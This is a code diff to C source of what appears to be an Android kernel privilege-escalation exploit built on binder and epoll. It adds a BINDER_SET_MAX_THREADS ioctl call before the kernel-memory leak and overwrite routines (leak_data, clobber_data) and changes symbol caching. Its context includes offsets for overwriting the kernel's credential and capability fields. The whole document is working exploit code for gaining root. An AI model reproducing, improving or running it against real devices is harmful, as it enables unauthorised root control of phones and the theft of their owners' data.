@@ -20,6 +20,9 @@
 #define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
 #define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)
 
+#define BINDER_SET_MAX_THREADS 0x40046205ul
+#define MAX_THREADS 2
+
 #undef NO_PROC_KALLSYMS
 #define KALLSYMS_CACHING
 #define KSYM_NAME_LEN 128
@@ -181,6 +184,8 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     message("PARENT: clobbering at 0x%lx", payloadAddress);
 
     struct epoll_event event = {.events = EPOLLIN};
+    int max_threads = 2;  
+    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
     if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
         error( "epoll_add");
 
@@ -284,6 +289,8 @@ void leak_data(void *leakBuffer, int leakAmount,
     unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
 
     struct epoll_event event = {.events = EPOLLIN};
+    int max_threads = 2;  
+    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
     if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
         error( "epoll_add");
 
@@ -862,7 +869,7 @@ unsigned long findSymbol_in_cache(char* execName, char* symbol) {
 
 void cacheSymbol(char* execName, char* symbol, unsigned long address) {
 #ifdef KALLSYMS_CACHING
-    if (address != 0) {
+    if (address != 0 && address != findSymbol_in_cache(execName, symbol)) {
         char* pathname = allocateSymbolCachePathName(execName, symbol);
         FILE *cached = fopen(pathname, "w");
         if (cached != NULL) {
